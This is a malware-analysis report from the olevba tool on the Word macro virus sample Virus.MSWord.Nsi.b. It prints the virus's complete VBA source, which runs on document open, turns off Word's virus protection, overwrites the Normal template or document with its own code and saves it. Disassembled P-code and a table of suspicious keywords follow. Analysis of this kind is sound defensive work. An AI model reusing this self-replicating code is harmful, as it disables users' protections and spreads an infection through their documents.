olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Nsi.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Nsi.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub document_open()
On Error Resume Next
Options.VirusProtection = 0: EnableCancelKey = 0
Set maci = MacroContainer.VBProject.vbComponents.Item(1)
Set macic = maci.codemodule
ns$ = Left(macic.lines(1, 1), 21)
Set inf = NormalTemplate: nsi$ = ns$ + "close"
If MacroContainer = inf Then Set inf = ActiveDocument: nsi$ = ns$ + "open"
Set infc = inf.VBProject.vbComponents
Set infi = infc.Item(1)
Set infic = infi.codemodule
For mx = 2 To infc.Count: infc.Remove infc.Item(2): Next mx
infic.deletelines 1, infic.countoflines
infic.addfromstring macic.lines(1, 17) 'count of lines!
infic.replaceline 1, nsi$
If Left(ActiveDocument.Name, 8) <> Mid$(macic.lines(1, 1), 13, 8) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub 'Psycode v1.0 1999
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Nsi.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 2446 bytes
' Line #0:
' 	FuncDefn (Private Sub document_open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St EnableCancelKey 
' Line #3:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd vbComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set maci 
' Line #4:
' 	SetStmt 
' 	Ld maci 
' 	MemLd codemodule 
' 	Set macic 
' Line #5:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld macic 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x0015 
' 	ArgsLd LBound 0x0002 
' 	St ns$ 
' Line #6:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set inf 
' 	BoS 0x0000 
' 	Ld ns$ 
' 	LitStr 0x0005 "close"
' 	Add 
' 	St nsi$ 
' Line #7:
' 	Ld MacroContainer 
' 	Ld inf 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set inf 
' 	BoS 0x0000 
' 	Ld ns$ 
' 	LitStr 0x0004 "open"
' 	Add 
' 	St nsi$ 
' 	EndIf 
' Line #8:
' 	SetStmt 
' 	Ld inf 
' 	MemLd VBProject 
' 	MemLd vbComponents 
' 	Set infc 
' Line #9:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld infc 
' 	ArgsMemLd Item 0x0001 
' 	Set infi 
' Line #10:
' 	SetStmt 
' 	Ld infi 
' 	MemLd codemodule 
' 	Set infic 
' Line #11:
' 	StartForVariable 
' 	Ld mx 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld infc 
' 	MemLd Count 
' 	For 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	Ld infc 
' 	ArgsMemLd Item 0x0001 
' 	Ld infc 
' 	ArgsMemCall Remove 0x0001 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld mx 
' 	EndForVariable 
' 	NextVar 
' Line #12:
' 	LitDI2 0x0001 
' 	Ld infic 
' 	MemLd countoflines 
' 	Ld infic 
' 	ArgsMemCall deletelines 0x0002 
' Line #13:
' 	LitDI2 0x0001 
' 	LitDI2 0x0011 
' 	Ld macic 
' 	ArgsMemLd lines 0x0002 
' 	Ld infic 
' 	ArgsMemCall addfromstring 0x0001 
' 	QuoteRem 0x0027 0x000F "count of lines!"
' Line #14:
' 	LitDI2 0x0001 
' 	Ld nsi$ 
' 	Ld infic 
' 	ArgsMemCall replaceline 0x0002 
' Line #15:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld macic 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x000D 
' 	LitDI2 0x0008 
' 	ArgsLd Mid$$ 0x0003 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #16:
' 	EndSub 
' 	QuoteRem 0x0008 0x0011 "Psycode v1.0 1999"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|open                |May open a file                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

